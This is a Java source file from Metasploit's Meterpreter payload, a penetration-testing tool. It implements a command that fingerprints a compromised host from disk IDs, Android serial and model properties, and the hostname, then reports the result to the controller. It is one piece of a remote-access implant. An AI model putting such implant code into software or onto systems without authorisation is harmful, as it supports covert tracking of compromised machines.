package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.Utils;
import com.metasploit.meterpreter.command.Command;

import java.io.File;
import java.io.IOException;

public class core_machine_id implements Command {

    private static final String[] hdPrefixes = new String[]{"ata-", "mb-"};
    private static String machine_id;

    private String getSerial() throws IOException {
        return Utils.runCommand("getprop ro.serialno").trim() +
                Utils.runCommand("getprop ro.product.brand").trim() +
                Utils.runCommand("getprop ro.product.model").trim();
    }

    private String getHDLabel() {
        File folder = new File("/dev/disk/by-id/");
        File[] listOfFiles = folder.listFiles();
        if (listOfFiles == null) {
            return null;
        }
        for (int i = 0; i < listOfFiles.length; i++) {
            String hdname = listOfFiles[i].getName();
            for (int j = 0; j < hdPrefixes.length; j++) {
                String prefix = hdPrefixes[j];
                if (hdname.startsWith(prefix)) {
                    return hdname.substring(prefix.length()).trim();
                }
            }
        }
        return "";
    }

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        if (machine_id == null) {
            String serial = getHDLabel();
            if (serial == null) {
                serial = getSerial();
            }
            machine_id = serial + ":" + Utils.getHostname();
        }
        response.add(TLVType.TLV_TYPE_MACHINE_ID, machine_id);
        return ERROR_SUCCESS;
    }
}
